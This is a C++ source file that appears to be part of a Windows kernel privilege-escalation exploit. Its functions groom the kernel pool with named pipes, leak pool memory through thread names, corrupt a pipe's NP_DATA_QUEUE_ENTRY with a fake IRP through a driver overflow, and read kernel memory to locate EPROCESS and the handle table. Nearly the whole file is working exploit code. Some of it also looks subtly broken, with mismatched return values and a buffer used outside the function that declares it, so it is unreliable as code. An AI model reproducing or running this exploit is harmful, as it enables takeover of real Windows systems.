#include "memoryBroker.h"
#include "Hvergelmir.h"
#include "pipeManager.h"
#include "config.h"


bool MemoryBroker::GetThreadNameLayout()
{

    bool correctLayout = false;
    const UINT64 attemptsPerCapture = 20;
    const UINT64 pipeCreateSize = 3000;

    std::vector<UINT64> iosbOffsets;
    std::vector<UINT64> npfrOffsets;

    iosbOffsets.reserve(64);
    npfrOffsets.reserve(64);

    BYTE* leakedData = NULL;
    UINT64 targetPipeOffset = 0;

    while (!correctLayout)
    {
        // Request leak from the registered ThreadNameManager
        auto nameManagerLocked = nameManager.lock();
        if (!nameManagerLocked) {
            DEBUG_PRINT(" [!] No ThreadNameManager registered\n");
            return false;
        }
        if (!nameManagerLocked->GetDataLeak(CHUNKSIZE, CHUNKSIZE * 10, 10)) {
            return false;
        }

        for (UINT64 i = 0; i < attemptsPerCapture && !correctLayout; ++i)
        {
            InvokePrimeOverflow(CHUNKSIZE);

            leakedData = nameManagerLocked->LeakData();
            if (!leakedData) {
                InvokePassOverflow();
                continue;
            }
            const UINT64 leakSize = nameManagerLocked->leakSize;

            iosbOffsets = ScanForPoolTag(leakedData, leakSize, "IoSB");
            if (iosbOffsets.empty())
            {
                InvokePassOverflow();
                continue;
            }

            // Create pipes once when we actually saw IoSB candidates
            auto pipeManagerLocked = pipeManager.lock();
            if (!pipeManagerLocked) {
                DEBUG_PRINT(" [!] No PipeManager available\n");
                return false;
            }
            pipeManagerLocked->CreatePipes(pipeCreateSize);

            // free previous leak buffer since we'll request a fresh one
            free(leakedData);
            leakedData = nullptr;

            // Refresh leak after pipe creation
            leakedData = nameManagerLocked->LeakData();
            if (!leakedData) {
                InvokePassOverflow();
                pipeManagerLocked->ClearPipes();
                continue;
            }
            npfrOffsets = ScanForPoolTag(leakedData, leakSize, "NpFr");

            if (!npfrOffsets.empty())
            {
                for (UINT64 iosbOffset : iosbOffsets)
                {
                    for (UINT64 npfrOffset : npfrOffsets)
                    {
                        if (npfrOffset > iosbOffset && npfrOffset - iosbOffset == 0x100)
                        {
                            DEBUG_PRINT("      Found IoSB followed by NPFR at offsets %llx and %llx\n", iosbOffset, npfrOffset);
                            std::vector<UINT64> markerOffsets = ScanForPoolTag(leakedData + npfrOffset - 0x4, CHUNKSIZE, "PIPE");
                            if (markerOffsets.empty()) continue;

                            size_t markerPosRel = (size_t)markerOffsets.front();
                            // absolute position in leakedData
                            UINT64 absolutePos = (npfrOffset - 0x4) + markerPosRel;
                            if (absolutePos + sizeof(UINT32) > leakSize) continue;

                            UINT64 pipeIndex = *(UINT32*)(leakedData + absolutePos);

                            targetPipeOffset = npfrOffset - 0x4;

                            pipeManagerLocked->ClearExtraPipes(pipeIndex);

                            correctLayout = true;
                            break;
                        }
                    }
                    if (correctLayout) break;
                }
            }
            if (correctLayout) break;

            InvokePassOverflow();
            pipeManagerLocked->ClearPipes();

            // free the leak buffer for this attempt
            if (leakedData) { free(leakedData); leakedData = nullptr; }
        }
    }
    // ensure leakedData freed
    if (leakedData) { free(leakedData); leakedData = nullptr; }
    return true;
}



bool MemoryBroker::CorruptThreadName()
{
    UINT64 fakeIRP = (UINT64)CreateFakeIRP();


    // Corrupt the NP_DATA_QUEUE_ENTRY of the target pipe with an overflow from the driver
    BYTE* payload = new BYTE[CHUNKSIZE + 0x10];
    memset(payload, 'c', 0x10);
    memcpy(payload + 0x10, leakedData + targetPipeOffset, CHUNKSIZE);
    ((NP_DATA_QUEUE_ENTRY*)(payload + 0x20))->Irp = (IRP*)fakeIRP;
    ((NP_DATA_QUEUE_ENTRY*)(payload + 0x20))->EntryType = 0x1;


    printf(" [*] Triggering Overflow to Corrupt NP_DATA_QUEUE_ENTRY of Target Pipe\n");
    printf("     Payload:\n");
    HexDumpLittleEndian(payload, 0x50);


    UINT64 clientManager = *(UINT64*)(leakedData + targetPipeOffset + 0x10);

    InvokeTriggerOverflow(payload, 0x50);


    if (!pipeManager->VerifyCorruption())
    {
        printf(" [!] Failed to verify corruption\n");
        return -1;
    }
}



bool MemoryBroker::GetEPROCESS(UINT64 iClientManager)
{
    DEBUG_PRINT("\n [*] ###### Locating EPROCESS and OBJECT_TABLE ######\n");

	if (iClientManager == 0) {
		DEBUG_PRINT(" [!] Invalid client manager pointer (0)\n");
		return false;
	}

	UINT64 fileObject = 0;
	Read(&fileObject, iClientManager - 0x10, sizeof(UINT64));
	if (fileObject == 0) {
		DEBUG_PRINT(" [!] Failed to read FILE_OBJECT from client manager\n");
		return false;
	}

	UINT64 eprocess = 0;
	// guard against underflowed or small addresses
	if (fileObject <= 0x1000) {
		DEBUG_PRINT(" [!] FILE_OBJECT looks invalid: %p\n", (void*)fileObject);
		return false;
	}

	Read(&eprocess, fileObject - 0x40, sizeof(UINT64));
	if (eprocess == 0) {
		DEBUG_PRINT(" [!] Failed to read EPROCESS from FILE_OBJECT\n");
		return false;
	}

	DEBUG_PRINT("     Found EPROCESS: %p\n", (void*)eprocess);

	UINT64 handleTableLocal = 0;
	Read(&handleTableLocal, eprocess + 0x300, sizeof(UINT64));
	if (handleTableLocal == 0) {
		DEBUG_PRINT(" [!] Failed to read HANDLE_TABLE from EPROCESS\n");
		return false;
	}

	this->HANDLE_TABLE = handleTableLocal;
	DEBUG_PRINT("     Found HANDLE_TABLE: %p\n", (void*)this->HANDLE_TABLE);

	return true;
}
